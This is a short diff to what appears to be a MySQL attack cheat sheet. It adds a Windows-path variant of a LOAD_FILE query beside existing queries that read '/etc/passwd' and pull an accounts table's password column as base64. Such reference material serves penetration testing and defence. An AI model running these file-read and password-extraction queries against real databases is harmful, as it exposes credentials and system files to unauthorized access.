@@ -353,6 +353,7 @@ mysql> SELECT TO_BASE64(password) FROM accounts where id = 1;
 
 ```c
 mysql> SELECT LOAD_FILE('/etc/passwd');
+mysql> SELECT LOAD_FILE('C:\\PATH\\TO\\FILE\\<FILE>');
 mysql> SELECT CAST(LOAD_FILE('/etc/passwd') AS CHAR)\G;
 ```
 
